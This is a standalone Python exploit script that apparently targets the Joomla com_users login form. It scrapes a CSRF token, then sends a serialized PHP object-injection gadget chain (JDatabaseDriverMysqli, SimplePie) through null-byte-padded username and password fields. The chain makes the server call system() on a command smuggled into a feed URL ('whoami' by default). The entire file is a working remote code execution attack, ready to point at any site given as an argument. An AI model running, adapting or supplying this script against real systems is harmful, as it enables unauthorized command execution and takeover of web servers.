#!/usr/bin/env python3
import requests
from bs4 import BeautifulSoup
import sys

command = "whoami"
function = "system"

template = 's:1:"a";O:21:"JDatabaseDriverMysqli":3:{s:4:"\\0\\0\\0a";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:5:"cache";b:1;s:19:"cache_name_function";s:FUNC_LEN:"FUNC_NAME";s:10:"javascript";i:9999;s:8:"feed_url";s:LENGTH:"PAYLOAD";}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";i:1;}'
payload =  'http://google.de; ' + command
final_payload = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function)))

url = sys.argv[1] + '/index.php/component/users'

s = requests.session()
print('[+] Getting CSRF Token')
resp = s.get(url)
html = BeautifulSoup(resp.text,'html.parser')
csrf = html.find_all('input')[-1].get("name")
print(csrf)

user_payload = '\\0\\0\\0' * 9
inj_object = 'AAA";'
inj_object += final_payload
inj_object += 's:6:"return";s:102:'
password_payload = inj_object
params = {
		'username': user_payload,
		'password': password_payload,
		'option':'com_users',
		'task':'user.login',
		csrf :'1'
		}

print('[+] Sending exploit ..')
resp  = s.post(url, data=params)
print(resp.text)